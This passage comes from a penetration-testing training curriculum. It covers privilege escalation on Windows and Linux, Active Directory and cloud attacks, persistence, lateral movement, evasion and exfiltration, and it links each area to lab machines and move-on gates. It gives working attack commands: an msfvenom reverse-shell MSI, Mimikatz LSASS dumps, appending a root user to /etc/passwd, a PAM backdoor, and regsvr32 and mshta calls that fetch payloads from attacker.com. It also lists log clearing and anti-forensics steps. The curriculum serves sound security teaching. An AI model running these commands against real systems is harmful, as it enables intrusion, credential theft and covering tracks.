  - Trusted binaries with `autoElevate = true` embedded in their manifest run at High Integrity without prompting if signed by Microsoft.
  - `fodhelper.exe` (Method 33): modifies `HKCU:\Software\Classes\ms-settings\Shell\Open\command` with delegateExecute property.
  - `eventvwr.exe` (Method 32): registry hijack under `HKCU:\Software\Classes\mscfile\shell\open\command`.
  - `sdclt.exe` (Method 45): abuses `HKCU:\Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe`.
  - Detection signature: Monitor `Sysmon Event ID 12/13` (Registry Key Create/Set) targeting user registry hives followed immediately by auto-elevating system binaries.

- [ ] **Mock Directories & Path Spoofing:**
  - Windows auto-elevation checks verify if an executable resides in `C:\Windows\System32`.
  - By creating a mock folder with a trailing space using extended path syntax (`\\?\C:\Windows \System32`), an attacker can place a malicious executable or DLL that bypasses the path validation check because the API normalizes the space during evaluation.

- [ ] **Auto-Elevate DLL Hijacking & COM Elevation:**
  - Injecting payloads into search paths of auto-elevating binaries (e.g., `mmc.exe`, `winsat.exe`) that load non-existent system DLLs.
  - Elevated COM interfaces: Abusing `IFileOperation` with COM elevation moniker to copy malicious files into protected directories like `C:\Program Files\` or `C:\Windows\System32\` from Medium integrity.
  - Abusing Microsoft Connection Manager Profile Installer (`cmstp.exe`) with a crafted INF file to trigger elevated execution.

- [ ] **UAC Level Verification:** `REG QUERY HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA` — confirm UAC status (`0` = disabled); check `ConsentPromptBehaviorAdmin` (`0` = elevate silently without prompt).

**Vector 5: Registry Privilege Abuse**

- [ ] **AlwaysInstallElevated:** If both `HKLM` and `HKCU\Software\Policies\Microsoft\Windows\Installer\AlwaysInstallElevated` are set to 1, any `.msi` package can be installed as SYSTEM.
  - Discovery: PowerUp `Get-RegistryAlwaysInstallElevated`
  - Exploit: `msfvenom -p windows/x64/shell_reverse_tcp ... -f msi > malicious.msi; msiexec /quiet /qn /i malicious.msi`

- [ ] **AutoRun Keys (Persistence → Escalation on Higher-Privilege Login):** Write a payload to a registry run key executed by a higher-privilege user:
  - `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` — requires admin write access but runs for all users
  - `HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run` — no special permission, runs as current user (useful for phishing context)

**Vector 6: Scheduled Task Exploitation**

- [ ] **Writable Task Binary:** If a scheduled task runs as SYSTEM but the binary it executes is writable by your user, replace the binary.
  - Discovery: `schtasks /query /fo LIST /v | findstr /i "Task To Run\|Run As User\|Status"`
  - Then: `icacls "C:\path\to\task\binary.exe"` — check write permission

- [ ] **Task XML Privilege Escalation:** Some tasks stored in `C:\Windows\System32\Tasks\` have weak ACLs — check the task XML directly for the `<RunAs>` element.

- [ ] **Writable Task Directory:** If the task binary isn't present but you can write to its expected path, create the binary there — it will run as SYSTEM on the next scheduled execution.

**Vector 7: Credential Hunting**

- [ ] **SAM/SYSTEM/SECURITY Registry Hives:** On a live system, these are locked. In offline access (or via shadow copies), extract NTLM hashes:
  - `reg save HKLM\SAM C:\sam.hive` + `reg save HKLM\SYSTEM C:\system.hive` → `secretsdump.py -sam sam.hive -system system.hive LOCAL`
  - Or from shadow copy: `copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\windows\system32\config\sam C:\sam.hive`

- [ ] **LSASS Memory Dump:** Dump credentials from LSASS for logged-in accounts (requires SYSTEM or SeDebugPrivilege):
  - `procdump.exe -accepteula -ma lsass.exe lsass.dmp` → parse offline with **Mimikatz** `sekurlsa::minidump lsass.dmp; sekurlsa::logonpasswords`
  - Mimikatz direct: `privilege::debug; sekurlsa::logonpasswords`
  - Detection: Event ID 4656 (handle to LSASS), Sysmon Event ID 10 (process access)

- [ ] **Credential Manager & DPAPI:** `cmdkey /list` — cached credentials; `vaultcmd /listcreds:"Windows Credentials"`. Decrypt DPAPI blobs with Mimikatz `dpapi::cred` using masterkey.

- [ ] **Configuration File Credential Hunting:**
  - `findstr /si password *.txt *.xml *.ini *.config *.ps1 *.bat`
  - `dir /s /b *pass* *cred* *vnc* *.config 2>nul`
  - `%windir%\Panther\Unattend.xml` — contains base64-encoded admin passwords from OS deployment
  - `C:\inetpub\wwwroot\web.config` — database connection strings often contain cleartext credentials
  - PowerShell history: `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`

**Vector 8: Kernel & Windows Component Exploits**

- [ ] **Kernel Exploit Identification:** Check OS version (`systeminfo`) against known public kernel privilege escalation exploits. Priority targets:
  - **MS16-032** (Secondary Logon, Windows 7–10): token impersonation via race condition
  - **MS16-075** (Potato, Windows Vista–2016): NTLM relay to local system
  - **HiveNightmare/SeriousSam** (CVE-2021-36934, Windows 10 21H1+): any user can read SAM hive
  - **PrintNightmare** (CVE-2021-34527): Windows Print Spooler code execution as SYSTEM

- [ ] **Exploit Suggester:** After `systeminfo`, paste output into **Windows-Exploit-Suggester-NG** (`wesng.py`): `python wesng.py --update; python wesng.py systeminfo.txt` — cross-references patches against known CVEs.

**Vector 9: Windows Token Privileges & Impersonation (The Potato Family)**

- [ ] **Token Privilege Inspection:** Run `whoami /priv` immediately upon obtaining a Windows shell. Identify high-risk privileges:
  - `SeImpersonatePrivilege` & `SeAssignPrimaryTokenPrivilege`: Standard on service accounts (IIS, MSSQL, Network Service). Allows impersonating tokens of authenticated local clients to escalate directly to `NT AUTHORITY\SYSTEM`.
  - `SeDebugPrivilege`: Allows process debugging — attach to and dump `lsass.exe` memory or inject shellcode into any SYSTEM process.
  - `SeBackupPrivilege` / `SeRestorePrivilege`: Bypass NTFS file system ACLs to read SAM/SYSTEM hives or `NTDS.dit`.
  - `SeTakeOwnershipPrivilege`: Take ownership of protected system binaries, edit ACLs via `icacls`, and replace binaries with payloads.
  - `SeLoadDriverPrivilege`: Load vulnerable signed third-party drivers to execute ring-0 kernel code (BYOVD - Bring Your Own Vulnerable Driver).

- [ ] **Impersonation Tooling & Evolution:**
  - **PrintSpoofer & PipePotato:** Abuses the Windows Print Spooler service via named pipe impersonation (`PrintSpoofer.exe -i -c cmd.exe`). Works reliably on Windows 10, 11, Server 2016, and Server 2019.
  - **GodPotato & SweetPotato:** Universal token impersonation using DCOM/RPC on Windows Server 2019 and 2022 where legacy DCOM reflection is patched.
  - **JuicyPotato:** Legacy DCOM reflection for Windows Server 2008/2012/2016 (mitigated on Server 2019+).

**Windows Privesc Lab Targets:**

> [!TIP]
> Work through these in order. Each machine reinforces specific vectors with different difficulty.

| Machine         | Platform    | Primary Vectors                          | Key Learning                       |
| --------------- | ----------- | ---------------------------------------- | ---------------------------------- |
| Blue            | HackTheBox  | MS17-010 (EternalBlue)                   | RCE → SYSTEM via kernel exploit    |
| Optimum         | HackTheBox  | HFS RCE → MS16-032                       | Exploit suggester workflow         |
| Bastard         | HackTheBox  | Drupal RCE → token impersonation         | SeImpersonatePrivilege path        |
| Windows PrivEsc | TryHackMe   | Service misconfigs, registry, DLL hijack | Structured privesc methodology     |
| Steel Mountain  | TryHackMe   | HFS → PowerUp → unquoted path            | Guided Windows privesc walkthrough |
| Alfred          | TryHackMe   | Jenkins → token impersonation            | JuicyPotato/Incognito              |
| Retro           | HackTheBox  | CVE research + credential hunting        | Manual credential discovery        |
| AccessChk       | Personal VM | Custom misconfigs                        | Build your own vuln lab            |

**Active Directory Attacks:**

- [ ] **Kerberoasting:** Extract **TGS tickets** for **service accounts (SPNs)**, crack offline with **hashcat/JtR** to recover **plaintext passwords**.

- [ ] **AS-REP Roasting:** Target accounts with **pre-authentication disabled**, extract **AS-REP hashes** for offline cracking.

- [ ] **Golden/Silver Tickets:** Forge **TGT (Golden)** or **TGS (Silver)** tickets using **krbtgt hash** or **service account hash** for **persistent domain access**.

- [ ] **DCSync Attack:** Abuse **replication rights** to extract **password hashes** from **Domain Controller** without direct access.

- [ ] **BloodHound/SharpHound:** Map **AD trust relationships, ACLs, group memberships** to find **shortest path to Domain Admin**.

- [ ] **NTLM Relay:** Capture **NTLM authentication** and relay to **SMB/LDAP/HTTP** services for **lateral movement**.

- [ ] **Constrained/Unconstrained Delegation:** Abuse **delegation rights** to impersonate **privileged users** across domain services.

**Linux Privilege Escalation:**

> [!IMPORTANT]
> **Why This Needs Its Own Methodology:** Linux privesc is the most consistently tested domain on OSCP, HTB, and real-world Linux engagements. The five bullets below are not enough. Work through each vector with a dedicated lab VM (try Tryhackme "Linux PrivEsc" room, HackTheBox Jarvis/Sunday, or build your own with intentional misconfigs). **[LinPEAS](Tools/LinPEAS.md)** and **Linux Smart Enumeration (lse.sh)** automate discovery — but you must understand every finding manually before relying on automation.

**Step 0 — Enumeration (Always First):**

- [ ] **Manual Baseline:** On foothold, immediately run: `id`, `whoami`, `hostname`, `uname -a`, `cat /etc/os-release`, `cat /proc/version`, `env`, `sudo -l`, `cat /etc/crontab`, `ls -la /etc/cron.*`, `find / -perm -4000 -type f 2>/dev/null` (SUID), `find / -perm -2000 -type f 2>/dev/null` (SGID).

- [ ] **Automated Tools:** Run **LinPEAS** (`curl -L https://linpeas.sh | sh`) and **linux-exploit-suggester-2** (`les2.sh`) — read every finding, do not blindly run suggested exploits.

- [ ] **Writable Paths:** Check `find / -writable -type f 2>/dev/null | grep -v proc` — writable files owned by root or executed by root cron jobs are high-value targets.

**Vector 1 — SUID/SGID Binary Abuse:**

- [ ] **Mechanism:** Files with the SUID bit set execute as their owner (usually root) rather than the calling user. Any vulnerability in the program, or any supported feature that spawns a shell or writes files, becomes a root escalation.

- [ ] **Discovery:** `find / -perm -4000 -type f 2>/dev/null` — list every SUID binary on the system. Cross-reference each against **GTFOBins** (`https://gtfobins.github.io`) for known escape techniques.

- [ ] **Common Exploitable Binaries:** `find`, `vim`, `nano`, `cp`, `mv`, `bash`, `python`, `perl`, `awk`, `nmap` (older versions), `env`, `less`, `more`, `man`, `ftp`, `screen`.

- [ ] **PATH Hijacking:** If a SUID binary calls another program using a relative path (e.g., `system("service apache2 start")` without full path), prepend a writable directory to `$PATH` containing a malicious `service` binary.

- [ ] **Shared Object Injection:** If `strace`/`ltrace` shows a SUID binary loading a missing `.so` file from a writable directory, compile a malicious shared object and place it there.

**Vector 2 — sudo Misconfiguration:**

- [ ] **Discovery:** `sudo -l` — lists what the current user can run as root (or other users) without a password or with one.

- [ ] **NOPASSWD Rules:** Any binary listed under `NOPASSWD` is an immediate escalation — check GTFOBins for the exact `sudo` escape method.

- [ ] **Wildcard Abuse:** `sudo /usr/bin/zip *` — if a wildcard is present and the binary interprets arguments as filenames, inject `--unzip-command=sh -c /bin/bash` or similar via specially named files.

- [ ] **LD_PRELOAD Injection:** If `sudo -l` shows `env_keep+=LD_PRELOAD`, compile a malicious shared library and set `sudo LD_PRELOAD=/tmp/evil.so <allowed_program>` to execute code as root before the real program.

- [ ] **Shell Escape via sudo:** Programs that run editors, pagers, or shells (vim, less, more, man, awk, perl, python) frequently allow shell escapes — check GTFOBins for the specific invocation syntax under `sudo`.

**Vector 3 — Cron Job Abuse:**

- [ ] **Discovery:** `cat /etc/crontab`, `ls -la /etc/cron.*`, `crontab -l`, `find / -name "*cron*" 2>/dev/null`, `systemctl list-timers` (systemd). Also monitor `/var/log/syslog` or `/var/log/cron` to identify jobs not visible in standard config files.

- [ ] **Writable Script Hijack:** If a root-owned cron job executes a script that you can write to, replace or append to the script with a reverse shell or setuid bash copy.

- [ ] **Writable Directory in PATH:** If a root cron job calls a binary using a relative name and the cron `PATH` variable includes a directory you can write to, place a malicious binary with the same name in that directory.

- [ ] **Wildcard Injection (cron + tar):** `tar czf /backup.tar.gz /tmp/*` run by root — create files named `--checkpoint=1` and `--checkpoint-action=exec=sh evil.sh` in `/tmp` to inject arbitrary command execution.

- [ ] **Systemd Timers:** Check `systemctl list-timers --all` and inspect the associated `.service` files with `systemctl cat <service>`. If the `ExecStart` path is writable, hijack it.

**Vector 4 — Linux Capabilities Abuse:**

- [ ] **Mechanism:** Linux capabilities divide root privileges into granular units. A binary granted `cap_setuid` can change its UID to 0 without being SUID. This is invisible to standard SUID searches.

- [ ] **Discovery:** `getcap -r / 2>/dev/null` — lists all binaries with assigned capabilities.

- [ ] **High-Value Capabilities:** `cap_setuid+ep`, `cap_net_bind_service+ep`, `cap_net_raw+ep`, `cap_sys_admin+ep`, `cap_dac_override+ep` (override DAC permissions on any file).

- [ ] **Python with cap_setuid:** `python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'`

- [ ] **Perl with cap_setuid:** `perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/bash";'`

**Vector 5 — Writable Files & PATH Hijacking:**

- [ ] **Writable /etc/passwd:** If `/etc/passwd` is world-writable, add a new root user with a known password hash (`openssl passwd -1 password` → `$1$...`): `echo 'hacker:$1$hash:0:0:root:/root:/bin/bash' >> /etc/passwd`.

- [ ] **Writable /etc/shadow:** Direct password change for root or any account.

- [ ] **Writable /etc/sudoers or /etc/sudoers.d/:** Add `ALL=(ALL:ALL) NOPASSWD: ALL` for your user.

- [ ] **NFS Root Squash Disabled:** If `/etc/exports` contains a share with `no_root_squash`, mount it from attacker machine as root, create a SUID binary, and execute on target.

**Vector 6 — Kernel Exploits (Last Resort):**

- [ ] **When to Use:** Kernel exploits are noisy, risky (system crash), and should be the last vector tried — after all misconfiguration-based vectors are exhausted.

- [ ] **Identification:** `uname -a` → kernel version → check **linux-exploit-suggester-2** and **searchsploit** for matching CVEs. Verify exploit is tested for your exact distribution and version.

- [ ] **Known Exploits:** Dirty COW (CVE-2016-5195), Dirty Pipe (CVE-2022-0847), DirtyCred (CVE-2022-2588), OverlayFS (CVE-2023-0386), Looney Tunables (CVE-2023-4911). Understand each mechanism rather than running blind.

- [ ] **Compilation on Target:** Many kernel exploits require compiling on the target or a matching system — check `gcc --version` and available headers (`/usr/include`).

**Vector 7 — Environment & Configuration Leaks:**

- [ ] **History Files:** `cat ~/.bash_history`, `cat ~/.zsh_history`, `cat ~/.mysql_history`, `cat ~/.python_history` — frequently contain passwords, commands run as root, or credentials passed as CLI arguments.

- [ ] **Config Files & Credentials:** `find / -name "*.conf" -o -name "*.config" -o -name "*.ini" -o -name ".env" 2>/dev/null | xargs grep -l "password\|passwd\|secret\|key" 2>/dev/null` — locate configuration files with embedded credentials.

- [ ] **SSH Keys:** `find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null` — unprotected private keys can provide lateral movement or privilege escalation.

- [ ] **Database Credentials:** Web application config files (`/var/www/html/config.php`, `wp-config.php`, `database.yml`, `.env`) frequently contain MySQL/PostgreSQL credentials that reuse the root password.

- [ ] **Readable /etc/shadow:** `cat /etc/shadow` — if readable, extract hashes and crack offline with hashcat.

**Vector 8 — Service & Process Exploitation:**

- [ ] **Root-Running Services:** `ps aux | grep root` — identify services running as root that may have vulnerabilities or writable config files.

- [ ] **Writable Service Binaries:** `find /etc/systemd/system/ -writable 2>/dev/null` — writable unit files allow modifying `ExecStart` to execute arbitrary commands as root on next service start/restart.

- [ ] **Weak File Permissions on Critical Binaries:** `ls -la /usr/bin/<service>` — if a service binary is world-writable, replace it.

**Vector 9 — Linux PAM & Authentication Architecture Abuse:**

- [ ] **PAM Configuration Flaws:** Audit `/etc/pam.d/` (`common-auth`, `sudo`, `sshd`) for overly permissive `sufficient` or `optional` configurations.
- [ ] **PAM Backdoor Injection:** Exploit write permissions on `/etc/pam.d/` or `/lib/security/` to insert `pam_exec.so` backdoors (`auth optional pam_exec.so seteuid /tmp/backdoor.sh`) or custom PAM modules that capture plaintext passwords or allow universal login passwords across all local users.

**Linux Privesc Lab Targets (Recommended Practice):**

| Platform    | Machine/Room            | Primary Vectors Covered              |
| ----------- | ----------------------- | ------------------------------------ |
| TryHackMe   | "Linux PrivEsc" room    | SUID, sudo, cron, capabilities, PATH |
| HackTheBox  | Jarvis, Sunday, Shocker | SUID, sudo misconfiguration          |
| HackTheBox  | Cronos                  | Cron job hijacking                   |
| VulnHub     | Lin.Security            | Comprehensive multipath              |
| Local Build | Custom misconfig VM     | Build your own with 8 vectors above  |

**Container & K8s Breakout:**

> **📌 Cross-Reference:** Container and Kubernetes security is taught in depth in **Part 25: Container & Orchestration Security** (Phase 6). The techniques below provide awareness for system hackers; Part 25 covers the full container attack surface.

- [ ] **Mounted docker.sock:** Escape **container to host** via **Docker socket abuse**.

- [ ] **Privileged Containers:** Escape from **--privileged, CAP_SYS_ADMIN** containers.

- [ ] **hostPath Mounts:** Write to **host filesystem** via mounted volumes for **persistence**.

- [ ] **RBAC/CNI Misconfigs:** Abuse **Kubernetes role bindings** and **network policy gaps**.

**Cloud Platform Attacks:**

- [ ] **AWS IAM Exploitation:** Enumerate **overprivileged roles**, abuse **AssumeRole**, exploit **resource-based policies** for **privilege escalation**.

- [ ] **S3 Bucket Abuse:** Find **public buckets** via **bucket enumeration**, exploit **ACL misconfigs**, steal data from **pre-signed URLs**.

- [ ] **Cloud Metadata Services (IMDS):** Query **169.254.169.254** for **IAM credentials, instance metadata**, use **IMDSv2 bypass** techniques.

- [ ] **Azure AD Exploitation:** Abuse **service principals**, steal **access tokens**, exploit **OAuth consent grants** for lateral movement.

- [ ] **GCP Service Accounts:** Steal **service account keys**, abuse **IAM bindings**, exploit **Compute Engine metadata**.

- [ ] **Lambda/Function Abuse:** Inject code into **serverless functions**, abuse **environment variables**, exfil via **function logs**.

**LOLBAS & Living off the Land:**

- [ ] **Windows:** Abuse **PowerShell, WMI, certutil, bitsadmin, mshta** for **execution and evasion**.

- [ ] **Linux:** Leverage **bash, find, awk, sed, curl, wget** for **lateral movement and persistence**.

---

<a id="stage-3-the-stronghold-persistence-lateral-movement"></a>

### **Stage 3: The Stronghold (Persistence & Lateral Movement)** — `🔬 Practical`

> [!TIP]
> **Goal:** Establish permanent presence and move horizontally across network.

**Credential Harvesting & Local Authentication Abuse:**

- [ ] **Pass-the-Hash (Workgroup):** Capture **local NTLM hashes** (via SAM or LSASS) and authenticate against adjacent workgroup hosts without cracking passwords. *(Note: Kerberos Pass-the-Ticket and Golden/Silver Tickets are explicitly taught in Phase 6).*

- [ ] **LSASS Dumping:** Extract **plaintext credentials and NTLM hashes** via **mimikatz, procdump, comsvcs.dll**, or PowerShell reflection. Understand Credential Guard and PPL protections.

- [ ] **Browser & Token Harvesting:** Extract stored browser credentials and session cookies from disk/memory (`dpapi`, SQLite databases).

- [ ] **SSH Key Harvesting:** Steal **unencrypted private keys** from `~/.ssh/id_rsa`, `known_hosts`, and hijacked SSH agent sockets (`SSH_AUTH_SOCK`).

**Userland & Service Persistence:**

- [ ] **Registry & Autorun Persistence:** Install persistence via Windows **Run/RunOnce keys, Startup folder, or Winlogon Userinit** for automatic re-execution upon login.

- [ ] **Scheduled Tasks & Services:** Configure persistent execution using `schtasks /create` or creating Windows Services (`sc create`) executing as SYSTEM.

- [ ] **Linux Cron & Systemd Persistence:** Install cron jobs (`/etc/crontab`, `/var/spool/cron/crontabs/`) or deploy custom systemd unit services.

- [ ] **SSH & Account Backdoors:** Append attacker public keys to `~/.ssh/authorized_keys` or create backdoor local administrator/sudo users (`net user /add` or `useradd -ou 0 -g 0`).

- [ ] **Web Shell Placement:** Upload lightweight web shells (PHP, ASP.NET, JSP) to writable web roots for out-of-band foothold retention. *(Note: Kernel rootkits and UEFI bootkits are advanced low-level techniques covered in Phase 7).*

**Lateral Movement, Pivoting & Egress Evasion:**

- [ ] **SMB/WinRM:** Use **PsExec, Invoke-Command, Evil-WinRM, WMIexec** to execute **commands on adjacent machines**.

- [ ] **Network Pivoting & SOCKS Tunneling (Multi-Homed Routing):**
  - **Chisel:** SOCKS5 reverse proxy over HTTP/WebSockets:
    - Attacker (server): `chisel server --reverse --port 8080`
    - Compromised Pivot (client): `chisel client <attacker_ip>:8080 R:1080:socks`
    - Route commands via `proxychains4 -q nmap -sT -Pn -p 80,445 10.10.10.x`
  - **Ligolo-ng:** High-performance TUN interface tunneling without proxychains overhead:
    - Set up `proxy` on attacker, create `ligolo` TUN interface (`sudo ip tuntap add user $(whoami) mode tun ligolo; sudo ip link set ligolo up`).
    - Run `agent` on victim host, connect back, establish session, and add kernel routing table rule (`sudo ip route add 172.16.1.0/24 dev ligolo`).
  - **SSH Dynamic Port Forwarding:** `ssh -D 1080 -N -f user@pivot_host` (creates local SOCKS4/5 proxy on port 1080).
  - **SSH Local & Remote Forwarding:**
    - Local: `ssh -L 8443:internal_host:443 user@pivot_host` (access internal HTTPS service directly via localhost:8443).
    - Remote: `ssh -R 4444:attacker_ip:4444 user@pivot_host` (forward internal reverse shell to attacker listener).

- [ ] **Egress Filtering Bypass & Covert Exfiltration:**
  - **DNS Tunneling:** When all outbound TCP/UDP is blocked except internal recursive DNS: deploy `dnscat2` or `iodine` to encapsulate arbitrary TCP traffic and command shells inside Base32/Base64 DNS TXT and CNAME queries.
  - **ICMP Payloads:** When Layer 4 is blocked but ping is permitted: exfiltrate data byte-by-byte using crafted ICMP echo request data fields (`nping --icmp`, `icmpsh`).
  - **HTTPS & CDN Fronting:** Wrap outbound command/control and data exfiltration inside trusted SaaS protocols (HTTPS webhooks to Discord, Slack, Telegram, or Google Drive API) to blend into legitimate enterprise telemetry.

- [ ] **SSH Agent Hijack:** Compromise **SSH forwarding** (`SSH_AUTH_SOCK`) to move to **key-trusted hosts**.

- [ ] **RDP Relay/NTLM Relay:** Exploit **weak signing** to relay **RDP/HTTP credentials** to **other systems**.

- [ ] **Printer/SNMP Abuse:** Exploit **print servers, SNMP v1/v2c** for **lateral access**.

- [ ] **SaaS-to-SaaS Pivoting:** Leverage **OAuth tokens/app integrations** to pivot from **Slack/Teams** into **Salesforce/GitHub/Google Workspace**.

---

<a id="stage-4-the-shadow-defense-evasion-anti-forensics"></a>

### **Stage 4: The Shadow (Defense Evasion & Anti-Forensics)** — `🧠🔬 Mixed`

> [!TIP]
> **Goal:** Blind the Blue Team and minimize evidence of compromise.

**Log Manipulation & Cleanup:**

- [ ] **Windows Event Log:** Delete or clear **Security, System, Application** logs; disable **audit logging**.

- [ ] **Linux Auditd:** Disable **auditd**, flush **auth.log, syslog** via **log rotation abuse**.

- [ ] **Firewall/SIEM:** Identify **log shipping** and poison **central logs** or syslog streams.

- [ ] **Application Logs:** Scrub **web server logs, database audit trails, application-specific logs**.

**Defense Evasion:**

- [ ] **EDR Evasion:** Disable **Windows Defender, real-time protection**; abuse **exploit guard gaps**.

- [ ] **DLP Bypass:** Exfil via **covert channels, low-bandwidth tunnels, encryption obfuscation**.

- [ ] **IDS/NIDS Evasion:** Use **packet fragmentation, timing jitter, polymorphic payloads**.

- [ ] **AppArmor/SELinux Bypass:** Disable or escape **mandatory access controls**.

- [ ] **Windows Credential Guard & RunAsPPL Bypass (Awareness):** Enterprise environments deploy these as primary mitigations against LSASS credential dumping. Understand both before attempting credential extraction on a modern Windows target:
  - **Windows Credential Guard** (enabled via Hyper-V VBS): Isolates NTLM hashes and Kerberos TGTs in a UEFI-secured Virtual Trust Level (VTL1) enclave. Standard LSASS dumps via mimikatz/procdump fail — the credential material is not in the LSASS process memory accessible from VTL0. Detection: `(Get-ItemProperty 'HKLM:\SYSTEM\CurrentControlSet\Control\LSA').LsaCfgFlags` — value 1 or 2 means enabled. If Credential Guard is active, pivot to alternative credential sources (DPAPI blobs, cached credentials, Kerberos relay).
  - **RunAsPPL (Protected Process Light):** Registry: `HKLM\SYSTEM\CurrentControlSet\Control\LSA\RunAsPPL = 1`. Makes LSASS a protected process — standard user-land handles are denied even with SeDebugPrivilege. Bypass techniques: PPL driver abuse (load a legitimately signed but vulnerable kernel driver to strip PPL protection — PPLdump/ProtectedProcesses), direct syscall LSASS access via LSA callbacks, or `comsvcs.dll MiniDump` method which may still succeed on older platforms. Deeper bypass techniques live in Phase 7 Part 42.
  - **Operational check before dumping:** Always verify Credential Guard and PPL status before attempting LSASS. A failed dump with no bypass plan wastes time and generates high-confidence EDR telemetry.

- [ ] **AppLocker / WDAC Bypass via LOLBAS:** Application whitelisting (AppLocker via GPO, WDAC via Intune/GPO) restricts executable paths but can be bypassed via trusted Windows binaries:
  - **AppLocker bypass techniques:** `MSBuild.exe` (compiles and executes inline C#), `regsvr32.exe /s /u /i:http://attacker.com/payload.sct scrobj.dll` (scriptlet execution, "Squiblydoo"), `mshta.exe http://attacker.com/payload.hta` (HTA execution), `InstallUtil.exe /logfile= /LogToConsole=false /U payload.exe` (uninstalls trigger code execution)
  - **WDAC bypass techniques:** WDAC is harder — it operates at kernel level and blocks drivers. Bypass requires abusing WDAC policy exceptions: script enforcement gaps in certain PowerShell language modes, using `rundll32.exe` with allowed DLLs, or targeting allowed installer paths via custom MSI.
  - **Detection:** Check AppLocker policy with `Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections`. Check WDAC with `Get-CIPolicy -FilePath "$env:SystemRoot\System32\CodeIntegrity\CIPolicies\Active\*"`.
  - **LOLBAS reference:** [lolbas-project.github.io](https://lolbas-project.github.io) — filter by "Execute" function type for current bypass candidates.
  - **Canonical coverage:** Full LOLBAS/GTFOBins methodology is in Phase 7 Part 42 (Offensive Development). This entry focuses on awareness and immediate tactical applicability.

**Anti-Forensics:**

- [ ] **File Deletion:** Use **shred, srm, cipher /w** for **secure wiping** of tools and artifacts.

- [ ] **Timestomping:** Modify **file timestamps** (touch -t, $MFT, xattr) to **hide activity**.

- [ ] **Memory Wiping:** Clear **bash history, .zsh_history, PowerShell history** and environment variables.

- [ ] **Registry Cleanup:** Delete **run keys, browser history, recent documents, prefetch files**.

- [ ] **Obfuscation:** Use **base64, hex, ROT13** to hide **scripts, commands, strings** from pattern matching.

---

<a id="stage-5-data-exfiltration-impact"></a>

### **Stage 5: Data Exfiltration & Impact** — `🔬 Practical`

> [!TIP]
> **Goal:** Extract sensitive data and demonstrate business impact.

**Data Exfiltration Channels:**

- [ ] **DNS Tunneling:** Encode **data in DNS queries** and exfil via **recursive lookups**.

- [ ] **HTTPS Covert Channels:** Blend **exfil into normal HTTPS** streams with **size/timing variance**.

- [ ] **Cloud APIs:** Use **pre-signed S3/Blob URLs, Drive APIs** for **high-bandwidth exfil**.

- [ ] **ICMP/Ping Tunneling:** Tunnel **data over ping requests** when **TCP/UDP egress blocked**.

- [ ] **Dead-Drop Upload:** Stage **files to attacker-controlled sites** (GitHub gists, pastebin, etc.).

**Impact & Damage:**

- [ ] **Ransomware Deployment:** Encrypt **critical files** with **RSA/AES hybrid** and demand **ransom**.

- [ ] **Data Destruction:** Wipe **backups, system restore points** to prevent **recovery**.

- [ ] **Service Disruption:** Corrupt **databases, config files** to trigger **outages and chaos**.

---

<a id="stage-6-the-professional-governance-reporting"></a>

### **Stage 6: The Professional (Governance & Reporting)** — `🧠🔬 Mixed`

> [!TIP]
> **Goal:** Execute within legal/ethical boundaries and deliver findings professionally.

**Rules of Engagement & Compliance:**

- [ ] **Scope Adherence:** Operate only within **authorized IP ranges, domains, systems** per engagement letter.

- [ ] **ROE Documentation:** Track **timeline, actions, access paths, artifacts discovered** for audit trail.

- [ ] **Escalation & Abort:** Know **when to stop, how to notify blue team, emergency procedures**.

- [ ] **Data Handling:** Secure **screenshots, credentials, exfiltrated files** with **encryption, access control**.

**Framework Alignment & Documentation:**

- [ ] **MITRE ATT&CK Mapping:** Correlate **every technique used** (T1234.567) to **documented tactics**.

- [ ] **Kill Chain Analysis:** Track the **Reconnaissance → Weaponization → Delivery → Exploitation → Installation → C2 → Actions** flow.

- [ ] **Vulnerability Timeline:** Document **discovery date, exploitation date, remediation deadline**.

**Audience-Centric Reporting:**

- [ ] **Executive Summary:** Non-technical **risk/impact narrative** for **board/C-suite**.

- [ ] **Technical Deep-Dive:** Detailed **attack chain, proof-of-concept, IOCs** for **security/engineering teams**.

- [ ] **Remediation Roadmap:** Prioritized **fixes by risk level** with **effort estimates and timelines**.

- [ ] **Metrics & KPIs:** Highlight **MTTD (Mean Time to Detect), MTTC (Mean Time to Contain), detection gaps**.

<a id="lab-progression-part-7-system-hacking-initial-compromise"></a>

### **Lab Progression (Part 7: System Hacking & Initial Compromise)**

> [!TIP]
> **Goal:** Practice compromise only in controlled environments and produce professional evidence.

- [ ] **Beginner Host Labs:** Complete at least 5 intentionally vulnerable Linux/Windows machines; document initial access, privilege escalation, evidence, and remediation.
- [ ] **Credential Handling Lab:** Capture and crack lab-only hashes, then document storage, chain of custody, and cleanup. Use the Password Cracking Gate before attempting this.
- [ ] **Post-Exploitation Timeline:** Build an operator timeline and defender timeline for one lab compromise.
- [ ] **Detection Pairing:** For every exploit path, identify Windows Event Logs, Sysmon, auditd, network, or SIEM artifacts.
  > [!IMPORTANT]
  > **Move-On Gate — Part 7: System Hacking & Initial Compromise**
  >
  > You are not ready to move to Phase 2B until you can demonstrate ALL of the following without referencing a walkthrough:
  >
  > **Initial Access**
  >
  > - [ ] Exploit at least 3 different standalone host initial access vectors (e.g., exposed vulnerable network service like vsftpd/Samba/Apache, default/weak credentials on SSH/SMB/RDP, unauthenticated service abuse like Redis/NFS/MySQL, or a staged client script payload) on lab targets and produce a working interactive shell
  > - [ ] Enumerate a target using only `nmap`, directory bruteforcing (`gobuster`/`ffuf`), and manual inspection without automated vulnerability scanners (`OpenVAS`/`Nessus`) or automated exploit frameworks as a first pass
  >
  > **Windows Privilege Escalation**
  >
  > - [ ] Achieve SYSTEM from a low-privilege foothold using at least 2 different vectors from the 9-vector methodology above (e.g., Potato token impersonation like SweetPotato/GodPotato for `SeImpersonatePrivilege`, unquoted service path, weak service binary permissions, AlwaysInstallElevated MSI abuse, or modern UAC bypass)
  > - [ ] Run `winPEAS` and manually interpret every orange/red finding without relying on auto-exploitation
  >
  > **Linux Privilege Escalation**
  >
